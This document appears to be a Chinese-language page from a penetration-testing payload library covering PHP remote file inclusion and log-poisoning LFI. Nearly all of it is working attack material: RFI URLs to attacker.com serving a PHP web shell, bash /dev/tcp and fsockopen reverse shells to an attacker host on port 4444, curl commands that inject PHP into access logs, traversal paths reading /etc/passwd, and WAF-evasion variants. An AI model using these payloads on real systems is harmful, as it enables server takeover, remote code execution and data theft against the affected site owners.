# RFI / 日志投毒 LFI payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:远程文件包含 + 日志投毒 LFI(把恶意内容写进 access_log / error_log / SSH log / mail log,再 LFI 包含触发)。

---

## A. 远程文件包含 (RFI)

远程文件包含漏洞利用技术
子类：**远程包含** · tags: `rfi` `remote` `file` `inclusion`

**前置条件：** 存在文件包含功能；allow_url_include=On；用户可控制包含路径

**攻击链：**

**1. 1. 探测RFI**
_探测远程文件包含_
```
?file=http://attacker.com/shell.txt
?file=http://attacker.com/shell.txt%00
?file=http://attacker.com/shell.txt?
```

**2. 2. 托管恶意文件**
_托管恶意文件并执行_
```
# shell.txt内容
<?php system($_GET['cmd']); ?>

# 访问
?file=http://attacker.com/shell.txt&cmd=id
```

**3. 3. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
# shell.txt内容
<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# 或使用
<?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

**4. 4. 使用data协议**
_使用data协议执行代码_
```
?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

**WAF/EDR 绕过变体：**

**1. 双写绕过**
_双写绕过关键字过滤_
```
?file=htthttp://p://attacker.com/shell.txt
?file=http://attackerattacker.com.com/shell.txt
```

**2. 大小写混淆**
_大小写混淆绕过_
```
?file=HtTp://attacker.com/shell.txt
?file=HTTP://attacker.com/shell.txt
```

**3. 协议替换**
_使用其他协议_
```
?file=ftp://attacker.com/shell.txt
?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt
```

---

### 日志投毒LFI  `lfi-log-poison`
通过日志投毒实现LFI到RCE
子类：**日志投毒** · tags: `lfi` `log` `poison` `rce`

**前置条件：** 存在LFI漏洞；可包含日志文件；日志文件可写

**攻击链：**

**1. 1. 探测日志文件位置**  _[linux]_
_探测日志文件位置_
```
# Apache日志
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/httpd/access_log
../../../var/log/nginx/access.log

# 系统日志
../../../var/log/auth.log
../../../var/log/syslog
```

**2. 2. 投毒User-Agent**
_在User-Agent中注入代码_
```
# 使用curl投毒
curl -A "<?php system($_GET['c']); ?>" http://target.com/

# 或使用Burp Suite修改User-Agent
User-Agent: <?php system($_GET['c']); ?>
```

**3. 3. 投毒请求路径**
_在请求路径中注入代码_
```
# 在URL路径中注入
curl http://target.com/<?php system($_GET['c']); ?>

# URL编码
curl http://target.com/%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E
```

**4. 4. 执行命令**  _[linux]_
_包含日志文件执行命令_
```
# 包含日志文件并执行命令
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/apache2/access.log&c=whoami
?file=../../../var/log/apache2/access.log&c=cat /etc/passwd
```

**5. 5. 反弹Shell**  _[linux]_
_获取反弹Shell_
```
?file=../../../var/log/apache2/access.log&c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_WAF绕过技术_
```
# 使用Base64编码
<?php eval(base64_decode($_GET['c'])); ?>
# 然后传递Base64编码的命令
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`../rce/13-file-rce-chain.md`](../rce/13-file-rce-chain.md)
